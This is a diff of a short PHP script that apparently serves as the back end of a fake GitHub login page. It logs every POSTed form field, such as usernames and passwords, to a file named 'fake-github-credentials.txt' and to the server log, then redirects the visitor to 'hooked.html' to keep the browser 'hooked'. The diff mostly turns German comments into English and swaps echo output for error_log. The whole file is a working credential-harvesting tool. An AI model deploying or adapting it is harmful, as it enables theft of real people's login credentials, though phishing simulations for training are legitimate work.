@@ -1,26 +1,22 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Öffne Datei zum Anhängen
+    // create file to log POST data
     $handle = fopen("fake-github-credentials.txt", "a");
     
     foreach ($_POST as $variable => $value) {
         $line = $variable . "-" . $value . "\r\n";
         fwrite($handle, $line);
 
-        // Ausgabe in Konsole
-        echo $line;
-
-        // sofort ausgeben (Buffer leeren)
-        flush();
+        // print post params to docker console
+        error_log($line);
     }
     
     fwrite($handle, "\r\n");
     fclose($handle);
 
-    // Redirect, damit die Seite nicht erneut POSTet
+    // Reload so the browser stays hooked
     header("Refresh:0; url=hooked.html");
     exit;
 }
 
-// Für GET requests: Optional Login-Formular anzeigen
 ?>
